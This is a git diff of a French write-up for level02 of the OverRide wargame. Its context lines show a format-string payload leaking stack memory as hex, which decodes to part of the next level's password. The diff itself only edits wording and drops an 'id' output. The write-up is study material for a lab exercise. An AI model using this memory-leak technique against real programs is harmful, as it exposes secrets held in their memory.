@@ -122,7 +122,7 @@ level02@OverRide:~$ cat /var/crash/file - | ./level02
 0x354a35686e475873 0x48336750664b394d (nil) 0x7025207025207025 0x2520702520702520
 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070  does not have access!
 ```
-On voit donc en sortie, notre enchainement de `702520` qui correspond a `%p ` une suite de characteres pui de nouveau notre enchainement,
+On voit donc en sortie, notre enchainement de `702520` qui correspond a `'%p '` une suite de characteres pui de nouveau notre enchainement,
 Penchons nous sur ces characteres:
 `0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d`
 Si on decode de l'hexa vers l'ascii la premiere suite (en enlevant le 0x au prealable), on obtient `unPR47hH`,
@@ -148,6 +148,4 @@ level02@OverRide:~$ su level03
 Password: 
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
 Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   /home/users/level03/level03
-level03@OverRide:~$ id
-uid=1003(level03) gid=1003(level03) groups=1003(level03),100(users)
 ```
